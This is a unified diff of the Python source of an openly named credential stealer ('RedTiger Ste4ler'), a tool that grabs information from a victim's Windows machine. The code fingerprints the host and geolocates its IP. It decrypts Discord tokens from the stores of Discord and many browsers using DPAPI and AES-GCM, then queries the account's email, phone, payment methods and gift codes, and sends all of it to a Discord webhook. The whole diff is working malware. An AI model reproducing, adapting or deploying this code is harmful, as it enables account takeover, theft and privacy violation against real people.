@@ -14,56 +14,11 @@
 
 
 Obligatory = r'''
-while True:
-    import os
-    try:
-        import platform
-        import ctypes
-        from screeninfo import *
-        import psutil
-        import GPUtil
-        import sqlite3
-        from urllib.request import Request, urlopen
-        import json
-        from json import *
-        import socket
-        import requests
-        from Crypto.Cipher import AES
-        import subprocess
-        import datetime
-        import base64
-        import re
-        import string
-        import win32api
-        import discord
-        from discord import Embed, File, SyncWebhook
-        import sys
-        import shutil
-        from pathlib import Path
-        from zipfile import ZipFile
-        from win32crypt import CryptUnprotectData
-        import uuid
-        from PIL import ImageGrab
-        import time
-        import browser_cookie3
-        import cv2
-        import pyautogui
-        import keyboard
-        import threading
-        from tkinter import messagebox
-        break
-    except:
-        modules = [
-            "--upgrade pip",
-            "platform", "ctypes", "screeninfo", "psutil", "GPUtil", "sqlite3",
-            "urllib3", "json", "socket", "requests", "pycryptodome", "subprocess",
-            "datetime", "base64", "re", "string", "pypiwin32", "discord.py",
-            "sys", "shutil", "pathlib", "uuid", "Pillow", "browser-cookie3",
-            "opencv-python", "pyautogui", "keyboard", "tkinter"
-        ]
-
-        for module in modules:
-            os.system(f"pip install {module}")
+import sys
+import os
+import socket
+import win32api
+import requests
 
 def B10ck_K3y(): pass
 def Unb10ck_K3y(): pass
@@ -94,7 +49,7 @@ def Clear():
 website = "redtiger.shop"
 color_embed = 0xa80505
 username_embed = 'RedTiger Ste4ler'
-avatar_embed = 'https://media.discordapp.net/attachments/1185940734256357427/1252261629546987550/logo_redtiger.png?ex=66719306&is=66704186&hm=c0cdee4699eb76dd404125866c4130d77ed177426daf71d8c976e5bbcb44c6bd&=&format=webp&quality=lossless&width=810&height=810'
+avatar_embed = 'https://media.discordapp.net/attachments/1268900329605300234/1270486977539604530/logo_redtiger.png?ex=66b72c73&is=66b5daf3&hm=c26e13dabc0297251613512e6ec2b8c8667550db16769a03cddb66fad8ef7eff&=&format=webp&quality=lossless&width=662&height=662'
 footer_text = f"RedTiger Ste4ler"
 footer_embed = {
         "text": footer_text,
@@ -111,61 +66,44 @@ except: username_pc = "None"
 try: displayname_pc = win32api.GetUserNameEx(win32api.NameDisplay)
 except: displayname_pc = "None"
 
-try: ip_address_public = requests.get('https://httpbin.org/ip').json()['origin']
+try: ip_address_public = requests.get("https://api.ipify.org?format=json").json().get("ip", "None")
 except: ip_address_public = "None"
 
-try:
-    socket.socket(socket.AF_INET, socket.SOCK_DGRAM).connect(('8.8.8.8', 80))  
-    ip_address_ipv4 = socket.socket(socket.AF_INET, socket.SOCK_DGRAM).getsockname()[0]
-    socket.socket(socket.AF_INET, socket.SOCK_DGRAM).close()
-except: ip_address_ipv4 = "None"
+try: ip_adress_local = socket.gethostbyname(socket.gethostname())
+except: ip_adress_local = "None"
 
 try:
-    ip_address_ipv6 = []
-    all_interfaces = socket.getaddrinfo(socket.gethostname(), None)
-    for interface in all_interfaces:
-        if interface[0] == socket.AF_INET6:
-            ip_address_ipv6.append(interface[4][0])
-    ip_address_ipv6 = ' / '.join(ip_address_ipv6)
+    response = requests.get(f"https://{website}/api/ip/ip={ip_address_public}")
+    api = response.json()
+
+    country = api.get('country', "None")
+    country_code = api.get('country_code', "None")
+    region = api.get('region', "None")
+    region_code = api.get('region_code', "None")
+    zip_postal = api.get('zip', "None")
+    city = api.get('city', "None")
+    latitude = api.get('latitude', "None")
+    longitude = api.get('longitude', "None")
+    timezone = api.get('timezone', "None")
+    isp = api.get('isp', "None")
+    org = api.get('org', "None")
+    as_number = api.get('as', "None")
 except:
-    ip_address_ipv6 = "None"
+    response = requests.get(f"http://ip-api.com/json/{ip_address_public}")
+    api = response.json()
 
-try:
-    try:
-        response = requests.get(f"https://{website}/api/ip/ip={ip_address_public}")
-        api = response.json()
-
-        country = api['country']
-        country_code = api['country_code']
-        region = api['region']
-        region_code = api['region_code']
-        zip_postal = api['zip']
-        city = api['city']
-        latitude = api['latitude']
-        longitude = api['longitude']
-        timezone = api['timezone']
-        isp = api['isp']
-        org = api['org']
-        as_number = api['as']
-    except:
-        response = requests.get(f"http://ip-api.com/json/{ip_address_public}")
-        api = response.json()
-
-        country = api['country']
-        country_code = api['countryCode']
-        region = api['regionName']
-        region_code = api['region']
-        zip_postal = api['zip']
-        city = api['city']
-        latitude = api['lat']
-        longitude = api['lon']
-        timezone = api['timezone']
-        isp = api['isp']
-        org = api['org']
-        as_number = api['as']
-except:
-    country, country_code, region, region_code, city, zip_postal, latitude, longitude, timezone, isp, org, as_number = "None", "None", "None", "None", "None", "None", "None", "None", "None", "None", "None", "None"
-'''
+    country = api.get('country', "None")
+    country_code = api.get('countryCode', "None")
+    region = api.get('regionName', "None")
+    region_code = api.get('region', "None")
+    zip_postal = api.get('zip', "None")
+    city = api.get('city', "None")
+    latitude = api.get('lat', "None")
+    longitude = api.get('lon', "None")
+    timezone = api.get('timezone', "None")
+    isp = api.get('isp', "None")
+    org = api.get('org', "None")
+    as_number = api.get('as', "None")'''
 
 # ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
 # ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
@@ -173,6 +111,18 @@ except:
 
 Sy5t3mInf0 = r'''
 def Sy5t3m_Inf0():
+    import platform
+    import subprocess
+    import uuid
+    import psutil
+    import GPUtil
+    import ctypes
+    import win32api
+    import string
+    import screeninfo
+    import requests
+    from discord import SyncWebhook, Embed
+
     try: sy5t3m_1nf0 = {platform.system()}
     except: sy5t3m_1nf0 = "None"
 
@@ -254,412 +204,271 @@ None    None       None       None       None
     except:
         p14tf0rm_1nf0 = "None"
 
+    try: scr33n_number = len(screeninfo.get_monitors())
+    except: scr33n_number = "None"
 
-    try:
-        def get_resolution():
-            hdc = ctypes.windll.user32.GetDC(0)
-            width = ctypes.windll.gdi32.GetDeviceCaps(hdc, 8)  
-            height = ctypes.windll.gdi32.GetDeviceCaps(hdc, 10)
-            ctypes.windll.user32.ReleaseDC(0, hdc)
-            return width, height
+    embed = Embed(title=f'System Info `{username_pc} "{ip_address_public}"`:', color=color_embed)
 
-        for i, monitor in enumerate(get_monitors(), 1):
-            if monitor.is_primary:
-                width, height = get_resolution()
-                name = monitor.name
-                is_primary = 'Yes'
+    embed.add_field(name=":bust_in_silhouette: User Pc:", value=f"""```Hostname    : {hostname_pc}
+Username    : {username_pc}
+DisplayName : {displayname_pc}```""", inline=False)
 
-        m41n_5cr33n = f"""Name         : "{name}" 
-Resolution   : "{width}x{height}"
-Main Screen  : "{is_primary}"
-"""
-    except:
-        m41n_5cr33n = "None"
+    embed.add_field(name=":computer: System:", value=f"""```Plateform     : {p14tf0rm_1nf0}
+Exploitation  : {sy5t3m_1nf0} {sy5t3m_v3r5i0n_1nf0}
+Screen Number : {scr33n_number}
 
+HWID : {hw1d}
+MAC  : {m4c_4ddr355}
+CPU  : {cpu_1nf0}, {cpu_c0r3_1nf0} Core
+GPU  : {gpu_1nf0}
+RAM  : {r4m_1nf0}Go```""", inline=False)
 
-    try:
-        def get_resolution():
-            hdc = ctypes.windll.user32.GetDC(0)
-            width = ctypes.windll.gdi32.GetDeviceCaps(hdc, 8) 
-            height = ctypes.windll.gdi32.GetDeviceCaps(hdc, 10) 
-            ctypes.windll.user32.ReleaseDC(0, hdc)
-            return width, height
+    embed.add_field(name=":satellite: Ip:", value=f"""```Public : {ip_address_public}
+Local  : {ip_adress_local}
+Isp    : {isp}
+Org    : {org}
+As     : {as_number}```""", inline=False)
 
+    embed.add_field(name=":minidisc: Disk:", value=f"""```{d15k_5t4t5}```""", inline=False)
 
-        monitors = list(get_monitors())
+    embed.add_field(name=":map: Location:", value=f"""```Country   : {country} ({country_code})
+Region    : {region} ({region_code})
+Zip       : {zip_postal}
+City      : {city}
+Timezone  : {timezone}
+Latitude  : {latitude}
+Longitude : {longitude}```""", inline=False)
 
-        if len(monitors) > 1:
+    embed.set_footer(text=footer_text, icon_url=avatar_embed)
 
-            monitors[1]
-
-            width, height = get_resolution()
-
-            s3c0nd_5cr33n =  f"""Name         : "{name}" 
-Resolution   : "{width}x{height}"
-Main Screen  : "No"
-"""
-        else:
-            s3c0nd_5cr33n = 'None'
-    except:
-        s3c0nd_5cr33n = "None"
-
-
-    def embed_system(webhook_url, title, fields, color, footer, username, avatar):
-
-        embed_data = {
-            'title': title,
-            "fields": fields,
-            'color': color,
-            "footer": footer
-        }
-
-
-        data = {
-            'embeds': [embed_data],
-            'username': username,  
-            'avatar_url': avatar
-        }
-
-
-        json_data = json.dumps(data)
-
-
-        headers = {
-            'Content-Type': 'application/json'
-        }
-
-
-        requests.post(webhook_url, data=json_data, headers=headers)
-
-    title = f'System Info `{username_pc} "{ip_address_public}"`:'
-
-    fields = [
-    {"name": f":bust_in_silhouette: | User Pc:", "value": f"""```Name        : "{hostname_pc}"
-Username    : "{username_pc}"
-DisplayName : "{displayname_pc}"```""", "inline": False},
-
-    {"name": f":computer: | System:", "value": f"""```Plateform    : "{p14tf0rm_1nf0}"
-Exploitation : "{sy5t3m_1nf0} {sy5t3m_v3r5i0n_1nf0}"
-
-HWID : "{hw1d}"
-MAC  : "{m4c_4ddr355}"
-CPU  : "{cpu_1nf0}, {cpu_c0r3_1nf0} Core"
-GPU  : "{gpu_1nf0}"
-RAM  : "{r4m_1nf0}Go"```""", "inline": False},
-
-{"name": f":satellite: | Ip:", "value": f"""```
-Public : "{ip_address_public}"
-Local  : "{ip_address_ipv4}"
-Ipv6   : "{ip_address_ipv6}"
-Isp    : "{isp}"
-Org    : "{org}"
-As     : "{as_number}"```""", "inline": False},
-
-{"name": f":minidisc: | Disk:", "value": f"""```{d15k_5t4t5}```""", "inline": False},
-
-{"name": f":desktop: | Screen:", "value": f"""```Main Screen:
-{m41n_5cr33n}
-
-Secondary Screen:
-{s3c0nd_5cr33n}```""", "inline": False},
-
-{"name": f":map: | Location:", "value": f"""```Country   : "{country} ({country_code})"
-Region    : "{region} ({region_code})"
-Zip       : "{zip_postal}"
-City      : "{city}"
-Timezone  : "{timezone}"
-Latitude  : "{latitude}"
-Longitude : "{longitude}"
-```""", "inline": False},
-
-] 
-    embed_system(w3bh00k_ur1, title, fields, color_embed, footer_embed, username_embed, avatar_embed)'''
+    w3bh00k = SyncWebhook.from_url(w3bh00k_ur1)
+    w3bh00k.send(embed=embed, username=username_embed, avatar_url=avatar_embed)'''
 
 # ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
 # ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
 # ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
 
 Di5c0rdT0k3n = r'''
+
 def Di5c0rd_T0k3n():
-    class D15c0rd:
-        def __init__(self, w3bh00k):
-            upload_t0k3n5(w3bh00k).upload()
+    import os
+    import re
+    import json
+    import base64
+    import requests
+    from Cryptodome.Cipher import AES
+    from Cryptodome.Protocol.KDF import scrypt
+    from win32crypt import CryptUnprotectData
+    from discord import SyncWebhook, Embed
 
-    class extr4ct_t0k3n5:
-        def __init__(self) -> None:
-            self.base_url = "https://discord.com/api/v9/users/@me"
-            self.appdata = os.getenv("localappdata")
-            self.roaming = os.getenv("appdata")
-            self.regexp = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
-            self.regexp_enc = r"dQw4w9WgXcQ:[^\"]*"
+    def extr4ct_t0k3n5():
+        base_url = "https://discord.com/api/v9/users/@me"
+        appdata_local = os.getenv("localappdata")
+        appdata_roaming = os.getenv("appdata")
+        regexp = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
+        regexp_enc = r"dQw4w9WgXcQ:[^\"]*"
+        t0k3n5 = []
+        uids = []
+        token_info = {}
 
-            self.t0k3n5, self.uids = [], []
+        paths = {
+            'Discord': appdata_roaming + '\\discord\\Local Storage\\leveldb\\',
+            'Discord Canary': appdata_roaming + '\\discordcanary\\Local Storage\\leveldb\\',
+            'Lightcord': appdata_roaming + '\\Lightcord\\Local Storage\\leveldb\\',
+            'Discord PTB': appdata_roaming + '\\discordptb\\Local Storage\\leveldb\\',
+            'Opera': appdata_roaming + '\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
+            'Opera GX': appdata_roaming + '\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
+            'Amigo': appdata_local + '\\Amigo\\User Data\\Local Storage\\leveldb\\',
+            'Torch': appdata_local + '\\Torch\\User Data\\Local Storage\\leveldb\\',
+            'Kometa': appdata_local + '\\Kometa\\User Data\\Local Storage\\leveldb\\',
+            'Orbitum': appdata_local + '\\Orbitum\\User Data\\Local Storage\\leveldb\\',
+            'CentBrowser': appdata_local + '\\CentBrowser\\User Data\\Local Storage\\leveldb\\',
+            '7Star': appdata_local + '\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\',
+            'Sputnik': appdata_local + '\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\',
+            'Vivaldi': appdata_local + '\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\',
+            'Google Chrome SxS': appdata_local + '\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\',
+            'Google Chrome': appdata_local + '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
+            'Google Chrome1': appdata_local + '\\Google\\Chrome\\User Data\\Profile 1\\Local Storage\\leveldb\\',
+            'Google Chrome2': appdata_local + '\\Google\\Chrome\\User Data\\Profile 2\\Local Storage\\leveldb\\',
+            'Google Chrome3': appdata_local + '\\Google\\Chrome\\User Data\\Profile 3\\Local Storage\\leveldb\\',
+            'Google Chrome4': appdata_local + '\\Google\\Chrome\\User Data\\Profile 4\\Local Storage\\leveldb\\',
+            'Google Chrome5': appdata_local + '\\Google\\Chrome\\User Data\\Profile 5\\Local Storage\\leveldb\\',
+            'Epic Privacy Browser': appdata_local + '\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\',
+            'Microsoft Edge': appdata_local + '\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb\\',
+            'Uran': appdata_local + '\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\',
+            'Yandex': appdata_local + '\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
+            'Brave': appdata_local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
+            'Iridium': appdata_local + '\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'
+        }
 
-            self.extr4ct()
-
-        def extr4ct(self) -> None:
-            paths = {
-                'Discord': self.roaming + '\\discord\\Local Storage\\leveldb\\',
-                'Discord Canary': self.roaming + '\\discordcanary\\Local Storage\\leveldb\\',
-                'Lightcord': self.roaming + '\\Lightcord\\Local Storage\\leveldb\\',
-                'Discord PTB': self.roaming + '\\discordptb\\Local Storage\\leveldb\\',
-                'Opera': self.roaming + '\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
-                'Opera GX': self.roaming + '\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
-                'Amigo': self.appdata + '\\Amigo\\User Data\\Local Storage\\leveldb\\',
-                'Torch': self.appdata + '\\Torch\\User Data\\Local Storage\\leveldb\\',
-                'Kometa': self.appdata + '\\Kometa\\User Data\\Local Storage\\leveldb\\',
-                'Orbitum': self.appdata + '\\Orbitum\\User Data\\Local Storage\\leveldb\\',
-                'CentBrowser': self.appdata + '\\CentBrowser\\User Data\\Local Storage\\leveldb\\',
-                '7Star': self.appdata + '\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\',
-                'Sputnik': self.appdata + '\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\',
-                'Vivaldi': self.appdata + '\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\',
-                'Chrome SxS': self.appdata + '\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\',
-                'Chrome': self.appdata + '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
-                'Chrome1': self.appdata + '\\Google\\Chrome\\User Data\\Profile 1\\Local Storage\\leveldb\\',
-                'Chrome2': self.appdata + '\\Google\\Chrome\\User Data\\Profile 2\\Local Storage\\leveldb\\',
-                'Chrome3': self.appdata + '\\Google\\Chrome\\User Data\\Profile 3\\Local Storage\\leveldb\\',
-                'Chrome4': self.appdata + '\\Google\\Chrome\\User Data\\Profile 4\\Local Storage\\leveldb\\',
-                'Chrome5': self.appdata + '\\Google\\Chrome\\User Data\\Profile 5\\Local Storage\\leveldb\\',
-                'Epic Privacy Browser': self.appdata + '\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\',
-                'Microsoft Edge': self.appdata + '\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb\\',
-                'Uran': self.appdata + '\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\',
-                'Yandex': self.appdata + '\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
-                'Brave': self.appdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
-                'Iridium': self.appdata + '\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'
-            }
-
-            for name, path in paths.items():
-                if not os.path.exists(path):
-                    continue
-                _d15c0rd = name.replace(" ", "").lower()
-                if "cord" in path:
-                    if not os.path.exists(self.roaming+f'\\{_d15c0rd}\\Local State'):
-                        continue
-                    for file_name in os.listdir(path):
-                        if file_name[-3:] not in ["log", "ldb"]:
-                            continue
-                        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
-                            for y in re.findall(self.regexp_enc, line):
-                                t0k3n = self.decrypt_val(base64.b64decode(y.split('dQw4w9WgXcQ:')[
-                                                         1]), self.get_master_key(self.roaming+f'\\{_d15c0rd}\\Local State'))
-
-                                if self.validate_t0k3n(t0k3n):
-                                    uid = requests.get(self.base_url, headers={
-                                                       'Authorization': t0k3n}).json()['id']
-                                    if uid not in self.uids:
-                                        self.t0k3n5.append(t0k3n)
-                                        self.uids.append(uid)
-
-                else:
-                    for file_name in os.listdir(path):
-                        if file_name[-3:] not in ["log", "ldb"]:
-                            continue
-                        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
-                            for t0k3n in re.findall(self.regexp, line):
-                                if self.validate_t0k3n(t0k3n):
-                                    uid = requests.get(self.base_url, headers={
-                                                       'Authorization': t0k3n}).json()['id']
-                                    if uid not in self.uids:
-                                        self.t0k3n5.append(t0k3n)
-                                        self.uids.append(uid)
-
-            if os.path.exists(self.roaming+"\\Mozilla\\Firefox\\Profiles"):
-                for path, _, files in os.walk(self.roaming+"\\Mozilla\\Firefox\\Profiles"):
-                    for _file in files:
-                        if not _file.endswith('.sqlite'):
-                            continue
-                        for line in [x.strip() for x in open(f'{path}\\{_file}', errors='ignore').readlines() if x.strip()]:
-                            for t0k3n in re.findall(self.regexp, line):
-                                if self.validate_t0k3n(t0k3n):
-                                    uid = requests.get(self.base_url, headers={
-                                                       'Authorization': t0k3n}).json()['id']
-                                    if uid not in self.uids:
-                                        self.t0k3n5.append(t0k3n)
-                                        self.uids.append(uid)
-
-        def validate_t0k3n(self, t0k3n5: str) -> bool:
-            r = requests.get(self.base_url, headers={'Authorization': t0k3n5})
-
-            if r.status_code == 200:
-                return True
-
-            return False
-
-        def decrypt_val(self, buff: bytes, master_key: bytes) -> str:
-            iv = buff[3:15]
-            payload = buff[15:]
-            cipher = AES.new(master_key, AES.MODE_GCM, iv)
-            decrypted_pass = cipher.decrypt(payload)
-            decrypted_pass = decrypted_pass[:-16].decode()
-
-            return decrypted_pass
-
-        def get_master_key(self, path: str) -> str:
+        for name, path in paths.items():
             if not os.path.exists(path):
-                return
+                continue
+            _d15c0rd = name.replace(" ", "").lower()
+            if "cord" in path:
+                if not os.path.exists(appdata_roaming + f'\\{_d15c0rd}\\Local State'):
+                    continue
+                for file_name in os.listdir(path):
+                    if file_name[-3:] not in ["log", "ldb"]:
+                        continue
+                    with open(f'{path}\\{file_name}', errors='ignore') as file:
+                        for line in file:
+                            for y in re.findall(regexp_enc, line.strip()):
+                                t0k3n = decrypt_val(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), get_master_key(appdata_roaming + f'\\{_d15c0rd}\\Local State'))
+                                if validate_t0k3n(t0k3n, base_url):
+                                    uid = requests.get(base_url, headers={'Authorization': t0k3n}).json()['id']
+                                    if uid not in uids:
+                                        t0k3n5.append(t0k3n)
+                                        uids.append(uid)
+                                        token_info[t0k3n] = (name, f"{path}\\{file_name}")
+            else:
+                for file_name in os.listdir(path):
+                    if file_name[-3:] not in ["log", "ldb"]:
+                        continue
+                    with open(f'{path}\\{file_name}', errors='ignore') as file:
+                        for line in file:
+                            for t0k3n in re.findall(regexp, line.strip()):
+                                if validate_t0k3n(t0k3n, base_url):
+                                    uid = requests.get(base_url, headers={'Authorization': t0k3n}).json()['id']
+                                    if uid not in uids:
+                                        t0k3n5.append(t0k3n)
+                                        uids.append(uid)
+                                        token_info[t0k3n] = (name, f"{path}\\{file_name}")
 
-            if 'os_crypt' not in open(path, 'r', encoding='utf-8').read():
-                return
+        if os.path.exists(appdata_roaming + "\\Mozilla\\Firefox\\Profiles"):
+            for path, _, files in os.walk(appdata_roaming + "\\Mozilla\\Firefox\\Profiles"):
+                for _file in files:
+                    if _file.endswith('.sqlite'):
+                        with open(f'{path}\\{_file}', errors='ignore') as file:
+                            for line in file:
+                                for t0k3n in re.findall(regexp, line.strip()):
+                                    if validate_t0k3n(t0k3n, base_url):
+                                        uid = requests.get(base_url, headers={'Authorization': t0k3n}).json()['id']
+                                        if uid not in uids:
+                                            t0k3n5.append(t0k3n)
+                                            uids.append(uid)
+                                            token_info[t0k3n] = ('Firefox', f"{path}\\{_file}")
+        return t0k3n5, token_info
 
-            with open(path, "r", encoding="utf-8") as f:
-                c = f.read()
-            local_state = json.loads(c)
+    def validate_t0k3n(t0k3n, base_url):
+        return requests.get(base_url, headers={'Authorization': t0k3n}).status_code == 200
 
-            master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
-            master_key = master_key[5:]
-            master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
+    def decrypt_val(buff, master_key):
+        iv = buff[3:15]
+        payload = buff[15:]
+        cipher = AES.new(master_key, AES.MODE_GCM, iv)
+        return cipher.decrypt(payload)[:-16].decode()
 
-            return master_key
+    def get_master_key(path):
+        if not os.path.exists(path):
+            return None
+        with open(path, "r", encoding="utf-8") as f:
+            local_state = json.load(f)
+        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
+        return CryptUnprotectData(master_key, None, None, None, 0)[1]
 
-    class upload_t0k3n5:
-        def __init__(self, w3bh00k: str):
-            self.t0k3n5 = extr4ct_t0k3n5().t0k3n5
-            self.w3bh00k = SyncWebhook.from_url(w3bh00k)
+    def upload_t0k3n5():
+        t0k3n5, token_info = extr4ct_t0k3n5()
+        w3bh00k = SyncWebhook.from_url(w3bh00k_ur1)
 
-        def upload(self):
-            if not self.t0k3n5:
-                return
+        if not t0k3n5:
+            embed = Embed(
+                title=f'Discord Token `{username_pc} "{ip_address_public}"`:', 
+                description=f"No discord tokens found.",
+                color=color_embed)
+            embed.set_footer(text=footer_text, icon_url=avatar_embed)
+            w3bh00k.send(embed=embed, username=username_embed, avatar_url=avatar_embed)
+            return
+        
+        for t0k3n_d15c0rd in t0k3n5:
+            api = requests.get('https://discord.com/api/v8/users/@me', headers={'Authorization': t0k3n_d15c0rd}).json()
 
-            for t0k3n_d15c0rd in self.t0k3n5:
-                user = requests.get('https://discord.com/api/v8/users/@me', headers={'Authorization': t0k3n_d15c0rd}).json()
+            u53rn4m3_d15c0rd = api.get('username', "None") + '#' + api.get('discriminator', "None")
+            d15pl4y_n4m3_d15c0rd = api.get('global_name', "None")
+            us3r_1d_d15c0rd = api.get('id', "None")
+            em4i1_d15c0rd = api.get('email', "None")
+            ph0n3_d15c0rd = api.get('phone', "None")
+            c0untry_d15c0rd = api.get('locale', "None")
+            mf4_d15c0rd = api.get('mfa_enabled', "None")
 
-                try: u53rn4m3_d15c0rd = user['username'] + ' / ' + user['discriminator']
-                except: u53rn4m3_d15c0rd = "None"
+            try:
+                if api.get('premium_type', 'None') == 0:
+                    n1tr0_d15c0rd = 'False'
+                elif api.get('premium_type', 'None') == 1:
+                    n1tr0_d15c0rd = 'Nitro Classic'
+                elif api.get('premium_type', 'None') == 2:
+                    n1tr0_d15c0rd = 'Nitro Boosts'
+                elif api.get('premium_type', 'None') == 3:
+                    n1tr0_d15c0rd = 'Nitro Basic'
+                else:
+                    n1tr0_d15c0rd = 'False'
+            except:
+                n1tr0_d15c0rd = "None"
 
-                try: d15pl4y_n4m3_d15c0rd = user['global_name']
-                except: d15pl4y_n4m3_d15c0rd = "None"
+            try: 
+                av4t4r_ur1_d15c0rd = f"https://cdn.discordapp.com/avatars/{us3r_1d_d15c0rd}/{api['avatar']}.gif" if requests.get(f"https://cdn.discordapp.com/avatars/{us3r_1d_d15c0rd}/{api['avatar']}.gif").status_code == 200 else f"https://cdn.discordapp.com/avatars/{us3r_1d_d15c0rd}/{api['avatar']}.png"
+            except: 
+                av4t4r_ur1_d15c0rd = avatar_embed
 
-                try: us3r_1d_d15c0rd = user['id']
-                except: us3r_1d_d15c0rd = "None"
+            try:
+                billing_discord = requests.get('https://discord.com/api/v6/users/@me/billing/payment-sources', headers={'Authorization': t0k3n_d15c0rd}).json()
+                if billing_discord:
+                    p4ym3nt_m3th0d5_d15c0rd = []
 
-                try: em4i1_d15c0rd = user['email']
-                except: em4i1_d15c0rd = "None"
-                
-                try: ph0n3_d15c0rd = user['phone']
-                except: ph0n3_d15c0rd = "None"
-                
-                try: mf4_d15c0rd = user['mfa_enabled']
-                except: mf4_d15c0rd = "None"
-                
-                try: c0untry_d15c0rd = user['locale']
-                except: c0untry_d15c0rd = "None"
-
-                try: av4t4r_ur1_d15c0rd = f"https://cdn.discordapp.com/avatars/{us3r_1d_d15c0rd}/{user['avatar']}.gif" if requests.get(f"https://cdn.discordapp.com/avatars/{us3r_1d_d15c0rd}/{user['avatar']}.gif").status_code == 200 else f"https://cdn.discordapp.com/avatars/{us3r_1d_d15c0rd}/{user['avatar']}.png"
-                except: av4t4r_ur1_d15c0rd = avatar_embed
-
-                try:
-                    if user['premium_type'] == 0:
-                        n1tr0_d15c0rd = 'False'
-                    elif user['premium_type'] == 1:
-                        n1tr0_d15c0rd = 'Nitro Classic'
-                    elif user['premium_type'] == 2:
-                        n1tr0_d15c0rd = 'Nitro Boosts'
-                    elif user['premium_type'] == 3:
-                        n1tr0_d15c0rd = 'Nitro Basic'
-                    else:
-                        n1tr0_d15c0rd = 'False'
-                except:
-                    n1tr0_d15c0rd = "None"
-
-                try:
-                    bi0_d15c0rd = user['bio']
-                    if not bi0_d15c0rd.strip() or bi0_d15c0rd.isspace():
-                        bi0_d15c0rd = "None"
-                except:
-                    bi0_d15c0rd = "None"
-
-                try:
-                    guilds_response = requests.get('https://discord.com/api/v9/users/@me/guilds?with_counts=true', headers={'Authorization': t0k3n_d15c0rd})
-                    if guilds_response.status_code == 200:
-                        guilds = guilds_response.json()
-                        try:
-                            owner_guilds = [guild for guild in guilds if guild['owner']]
-                            own3r_gui1d_c0unt = len(owner_guilds)
-                            own3r_gui1d_n4m35 = [] 
-                            if owner_guilds:
-                                for guild in owner_guilds:
-                                    own3r_gui1d_n4m35.append(f"{guild['name']} ({guild['id']}) / ")
-                                own3r_gui1d_n4m35 = "\n" + "\n".join(own3r_gui1d_n4m35)
-                        except:
-                            own3r_gui1d_c0unt = "None"
-                            own3r_gui1d_n4m35 = "None" 
-                except:
-                    own3r_gui1d_c0unt = "None"
-                    own3r_gui1d_n4m35 = "None"
-            
-                try:
-                    billing_d15c0rd = requests.get('https://discord.com/api/v6/users/@me/billing/payment-sources', headers={'Authorization': t0k3n_d15c0rd}).json()
-                    if billing_d15c0rd:
-                        p4ym3nt_m3th0d5_d15c0rd = []
-
-                        for method in billing_d15c0rd:
-                            if method['type'] == 1:
-                                p4ym3nt_m3th0d5_d15c0rd.append('CB')
-                            elif method['type'] == 2:
-                                p4ym3nt_m3th0d5_d15c0rd.append("Paypal")
-                            else:
-                                p4ym3nt_m3th0d5_d15c0rd.append('Other')
-                        p4ym3nt_m3th0d5_d15c0rd = ' / '.join(p4ym3nt_m3th0d5_d15c0rd)
-                    else:
-                        p4ym3nt_m3th0d5_d15c0rd = "None"
-                except:
-                    p4ym3nt_m3th0d5_d15c0rd = "None"
-
-                try:
-                    g1ft_c0d35 = requests.get('https://discord.com/api/v9/users/@me/outbound-promotions/codes', headers={'Authorization': t0k3n_d15c0rd}).json()
-                    if g1ft_c0d35:
-                        codes = []
-                        for g1ft_c0d35_d15c0rd in g1ft_c0d35:
-                            name = g1ft_c0d35_d15c0rd['promotion']['outbound_title']
-                            g1ft_c0d35_d15c0rd = g1ft_c0d35_d15c0rd['code']
-                            data = f"Gift: {name}\nCode: {g1ft_c0d35_d15c0rd}"
-                            if len('\n\n'.join(g1ft_c0d35_d15c0rd)) + len(data) >= 1024:
-                                break
-                            g1ft_c0d35_d15c0rd.append(data)
